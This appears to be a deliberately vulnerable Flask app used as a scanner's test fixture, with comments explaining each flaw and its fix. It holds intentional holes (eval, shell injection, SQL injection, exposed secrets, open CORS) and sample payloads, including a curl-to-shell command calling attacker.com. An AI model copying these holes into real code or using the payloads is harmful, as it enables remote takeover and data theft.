"""
vulnerable.py -- a deliberately broken web app, used as VibeSec's test fixture.

READ THIS FIRST
    Every function below is wrong on purpose. Do not copy any of it into real code.
    It exists so that VibeSec has something with known-bad patterns to scan, which is
    the only way to answer the question "is my scanner actually working, or is it just
    finding nothing?" A scanner that reports zero findings on a clean file and zero
    findings on a broken file is indistinguishable from a scanner that is broken.

WHY THESE SIX SPECIFICALLY
    These aren't random textbook vulnerabilities -- they're the ones that show up
    over and over in AI-generated code. LLMs are trained on a lot of tutorial code and
    Stack Overflow answers, and tutorial code optimises for "shortest thing that runs,"
    not "thing that survives contact with a hostile user." So the model reproduces the
    tutorial shape: f-strings for SQL because they read nicely, a key pasted inline
    because that's what makes the snippet self-contained, a debug route because the
    tutorial was teaching debugging.

    Each vulnerability below is marked with a VULN header explaining what it is, why
    it's dangerous, and why an LLM tends to produce it.

This file is Python 3 and imports Flask/sqlite3. It never needs to actually RUN --
static analysis reads source code, it doesn't execute it. You can scan this file
without Flask installed.
"""

import os
import sqlite3
import subprocess

from flask import Flask, request, jsonify

app = Flask(__name__)


# =============================================================================
# VULN 1 -- Hardcoded secret
# =============================================================================
# WHAT IT IS
#   A live API key written directly into source code instead of being read from an
#   environment variable or a secrets manager at runtime.
#
# WHY IT'S DANGEROUS
#   Source code travels further than people expect. The moment this file is committed,
#   the key is in Git history -- and deleting the line later does NOT remove it,
#   because the old commit still contains it. Push to a public GitHub repo and
#   automated scrapers will find and use the key within minutes; this is a well-
#   documented phenomenon, not a hypothetical. The key must be treated as burned and
#   rotated, which is why "just delete the line" is never the fix.
#
# WHY AN LLM WRITES THIS
#   The model is asked for a working example. A working example needs a key in it.
#   Writing `os.environ["API_KEY"]` produces a snippet that crashes when you paste it,
#   so the model inlines a placeholder -- and the developer swaps in their real key
#   without moving it out of the file.
#
# THE FIX
#   API_KEY = os.environ["OPENAI_API_KEY"]     # crashes loudly if unset, which is good
API_KEY = "sk-abc123verysecretkey"
DB_PASSWORD = "hunter2"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"


# =============================================================================
# VULN 2 -- SQL injection via f-string
# =============================================================================
# WHAT IT IS
#   The user's input is pasted directly into the text of a SQL query. The database
#   receives one finished string and has no way to tell which parts came from the
#   programmer and which parts came from a stranger on the internet.
#
# WHY IT'S DANGEROUS
#   Input isn't data here -- it's code. Given user_id = "' OR 1=1 --", the query becomes
#       SELECT * FROM users WHERE id = '' OR 1=1 --'
#   The `--` starts a SQL comment, so everything after it is ignored, and `OR 1=1` is
#   true for every row. This returns the entire users table. If this query backs a
#   login check, the attacker is now logged in as the first user in the table, which
#   is usually the admin. Worse payloads can append UNION SELECT to read other tables
#   (password hashes, payment records) or DROP TABLE to destroy them.
#
# WHY AN LLM WRITES THIS
#   f-strings are the idiomatic modern way to build strings in Python, and the model
#   applies that idiom uniformly. It reads beautifully and it is catastrophically wrong
#   in exactly this one context.
#
# THE FIX
#   Use a parameterised query. The ? is a placeholder -- the driver sends the query
#   and the values along separate channels, so user input is never parsed as SQL:
#       cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
def get_user(user_id):
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()

    # The vulnerable line. user_id is interpolated straight into the query text.
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)

    return cursor.fetchall()


def search_products(name):
    """A second injection, using .format() instead of an f-string.

    Included deliberately: it tests whether the scanner recognises the *pattern*
    (untrusted value concatenated into SQL) or has just memorised f-strings. A rule
    that only catches f-strings will miss this one -- and .format(), %-formatting,
    and plain `+` concatenation are all equally exploitable.
    """
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    query = "SELECT * FROM products WHERE name LIKE '%{}%'".format(name)
    cursor.execute(query)
    return cursor.fetchall()


# =============================================================================
# VULN 3 -- eval() on user input
# =============================================================================
# WHAT IT IS
#   eval() takes a string and executes it as Python. Here the string arrives from an
#   HTTP request, so an anonymous user is choosing what code the server runs.
#
# WHY IT'S DANGEROUS
#   This is remote code execution -- the most severe class of vulnerability there is.
#   It isn't limited to arithmetic just because the parameter is named "expression."
#   Python expressions can import modules and call them, so an attacker sends:
#       __import__('os').system('curl attacker.com/shell.sh | sh')
#   and now they have a shell on your server, running as whatever user the app runs as.
#   From there: read the database, read that hardcoded API key above, pivot to other
#   machines on the internal network.
#
#   Note that "validate the input first" is a losing game here. eval() sandboxes are
#   notoriously escapable -- blocking `__import__` still leaves attribute traversal
#   through object.__subclasses__() and similar tricks. The only reliable answer is
#   to not call eval() on untrusted input at all.
#
# WHY AN LLM WRITES THIS
#   "Build a calculator endpoint" has an obvious three-line answer that uses eval(),
#   and a fifty-line answer that writes a real expression parser. The model gives you
#   the answer that fits in a code block.
#
# THE FIX
#   For arithmetic, use a parser that only understands arithmetic:
#       import ast, operator
#       # walk the ast.parse(expr, mode='eval') tree, allowing only numeric literals
#       # and a whitelist of operators -- anything else raises.
#   Or use a purpose-built library like simpleeval.
@app.route("/calculate")
def calculate():
    expression = request.args.get("expr")
    result = eval(expression)  # remote code execution
    return jsonify({"result": result})


# =============================================================================
# VULN 4 -- Command injection via subprocess with shell=True
# =============================================================================
# WHAT IT IS
#   A shell command is assembled by string concatenation, with a user-supplied value
#   in the middle, and then handed to a shell to interpret.
#
# WHY IT'S DANGEROUS
#   shell=True means the string is parsed by the system shell before it runs -- and
#   the shell treats characters like ;  |  &  $()  `` as control syntax, not text.
#   So host = "example.com; cat /etc/passwd" becomes two commands: the ping, then the
#   attacker's command. Same outcome as VULN 3 -- arbitrary code execution -- just
#   through a different door.
#
# WHY AN LLM WRITES THIS
#   shell=True is what makes a one-line subprocess example work, because it lets you
#   pass a command as a single readable string instead of a list of arguments. It is
#   also what makes it exploitable.
#
# THE FIX
#   Pass a list, and drop shell=True. With no shell involved, there is no shell syntax
#   to inject -- the semicolons become literal characters in the hostname argument:
#       subprocess.run(["ping", "-c", "1", host], capture_output=True)
#   Then validate `host` against an allowlist or a hostname regex on top of that.
@app.route("/ping")
def ping_host():
    host = request.args.get("host")
    output = subprocess.run("ping -c 1 " + host, shell=True, capture_output=True)
    return jsonify({"output": output.stdout.decode()})


# =============================================================================
# VULN 5 -- Debug endpoint left open
# =============================================================================
# WHAT IT IS
#   A route that dumps internal system state, with no authentication, reachable by
#   anyone who knows (or guesses) the URL.
#
# WHY IT'S DANGEROUS
#   This one rarely gets you owned by itself -- it gets you owned in combination with
#   something else, which is why people underrate it. os.environ is where the well-run
#   half of the app keeps its secrets, so this endpoint hands over database passwords,
#   API keys, and session signing keys in one response. The cwd and file listing tell
#   an attacker exactly how the app is laid out, turning blind guessing into targeted
#   attacks. Reconnaissance like this is what turns a hard exploit into an easy one.
#
#   "Nobody knows the URL" is not a control. Attackers run wordlist scanners against
#   every site; /debug, /admin, and /status are in every wordlist.
#
# WHY AN LLM WRITES THIS
#   It was asked to make the app debuggable, and this is genuinely useful during
#   development. The failure isn't writing it -- it's that nothing in the code marks
#   it as development-only, so it ships to production untouched.
#
# THE FIX
#   Delete it. If you truly need it, gate it on an auth check AND an environment
#   check, and never return os.environ:
#       @app.route("/debug")
#       @require_admin
#       def debug_info():
#           if os.environ.get("APP_ENV") != "development":
#               abort(404)
#           ...
@app.route("/debug")
def debug_info():
    return jsonify({
        "environment": dict(os.environ),   # every secret the process holds
        "cwd": os.getcwd(),
        "files": os.listdir("."),
        "python_path": os.sys.path,
    })


# =============================================================================
# VULN 6 -- No input validation before a privileged operation
# =============================================================================
# WHAT IT IS
#   A function that accepts caller-controlled data and acts on it without checking
#   the types, the ranges, or -- most importantly here -- whether the caller is
#   allowed to do what they're asking.
#
# WHY IT'S DANGEROUS
#   Look at what the client controls: the whole payload. `is_admin` comes from the
#   request body, so a user submits {"is_admin": true} and promotes themselves. That's
#   privilege escalation via mass assignment. `balance` is equally client-controlled,
#   so they can also set their own account balance.
#
#   This is the vulnerability class that static analysis is worst at, and it's worth
#   understanding why: there's no dangerous *function* being called here. eval() and
#   shell=True are recognisable shapes a scanner can pattern-match. "This field should
#   not have been writable by the client" requires knowing what the application means,
#   which is exactly the gap the LLM half of VibeSec is supposed to cover. Watch
#   whether it does -- if the scan misses this one, that's Step 6's false-negative
#   finding sitting right here in the fixture.
#
# WHY AN LLM WRITES THIS
#   The prompt was "write an endpoint that updates a user profile." Iterating the
#   submitted dict is the direct, general solution. Knowing that `is_admin` is
#   privileged and `email` isn't requires context the model was never given.
#
# THE FIX
#   Allowlist the fields a client may write, and never trust the client for authority:
#       ALLOWED = {"email", "display_name", "bio"}
#       updates = {k: v for k, v in data.items() if k in ALLOWED}
#   Plus a real authorization check that the caller owns this user_id.
@app.route("/update_profile", methods=["POST"])
def update_profile():
    data = request.get_json()

    user_id = data["user_id"]          # no check that the caller owns this account
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()

    # Every key the client sent becomes a column update, including is_admin.
    for field, value in data.items():
        cursor.execute(f"UPDATE users SET {field} = '{value}' WHERE id = {user_id}")

    conn.commit()
    return jsonify({"status": "updated"})


# =============================================================================
# VULN 7 -- Permissive CORS
# =============================================================================
# WHAT IT IS
#   Cross-Origin Resource Sharing is the browser rule that stops evil.com's JavaScript
#   from reading responses from your-bank.com. A wildcard origin switches that rule off.
#
# WHY IT'S DANGEROUS
#   With credentials allowed and origin set to "*", any website a logged-in user visits
#   can make authenticated requests to this API using that user's cookies AND read the
#   responses. A user visits a malicious page in another tab; that page silently reads
#   their account data. The browser's core protection against exactly this attack has
#   been explicitly disabled.
#
#   (Browsers actually refuse the literal combination of "*" with credentials, which
#   is why real-world code often reflects the request's Origin header back instead --
#   achieving the same wildcard effect while slipping past that check. Worth knowing
#   when you go looking for this pattern in the wild.)
#
# WHY AN LLM WRITES THIS
#   The developer's frontend was blocked by a CORS error and they asked how to fix it.
#   "Allow all origins" makes the error go away immediately. It is the fastest possible
#   answer to the question that was asked, and the wrong answer to the question that
#   was meant.
#
# THE FIX
#   Name the origins you actually serve:
#       CORS(app, origins=["https://app.example.com"], supports_credentials=True)
#
# NOTE: the first line below is commented out on purpose. The project spec asked for a
# CORS wildcard "as a comment/string" -- which is itself a useful test. Semgrep parses
# code, not comments, so it will NOT flag the commented line. That's correct behaviour,
# not a bug, and it's a good demonstration of what static analysis can and cannot see.
# The line under it is live code and SHOULD be flagged.
#
# allow_origins=["*"]
CORS_SETTINGS = {"allow_origins": ["*"], "allow_credentials": True}


@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Credentials"] = "true"
    return response


if __name__ == "__main__":
    # debug=True is its own vulnerability in production: Flask's debugger exposes an
    # interactive Python console on the error page. Anyone who can trigger an exception
    # gets a REPL on your server. host="0.0.0.0" binds to every network interface,
    # so it's reachable from outside the machine rather than just localhost.
    app.run(debug=True, host="0.0.0.0")
